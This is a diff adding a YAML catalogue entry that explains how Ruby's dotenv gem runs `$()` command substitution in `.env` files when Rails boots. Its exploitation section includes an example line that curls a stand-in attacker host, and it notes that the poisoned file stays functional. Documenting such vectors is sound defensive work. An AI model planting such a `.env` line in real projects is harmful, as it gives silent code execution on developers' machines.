@@ -1,0 +1,37 @@
+name: Ruby dotenv
+id: ruby-dotenv
+description: >
+  The `dotenv` gem loads environment variables from `.env` (and other) files into `ENV`.
+  It supports command substitution using `$()`
+  syntax, meaning shell commands embedded in `.env` values are executed by the
+  shell at load time.
+
+  In Rails applications it hooks into the `before_configuration`
+  callback and loads `.env` files automatically — no extra code required.
+  Dropping a malicious `.env` file into a Rails project root is enough for the
+  payload to execute the next time the app boots, a test suite runs, or a
+  developer starts a Rails console.
+tags:
+  - ruby
+  - rails
+  - dotenv
+  - config
+
+exploitation: |
+  dotenv's command substitution feature evaluates `$(command)` expressions
+  in `.env` file values by passing them to the shell.
+
+  ```bash
+  # .env
+  KEY=$(curl "https://attacker.com/")
+  ```
+
+  The `curl` executes the moment Rails (or any process that calls
+  `Dotenv.load`) reads the file. The result is assigned to `KEY` in `ENV` as
+  normal, so the file continues to function as a legitimate dotenv config.
+
+references:
+  - url: https://github.com/bkeepers/dotenv#customizing-rails
+    description: dotenv Rails integration and load order documentation
+  - url: https://github.com/bkeepers/dotenv#command-substitution
+    description: dotenv command substitution feature documentation
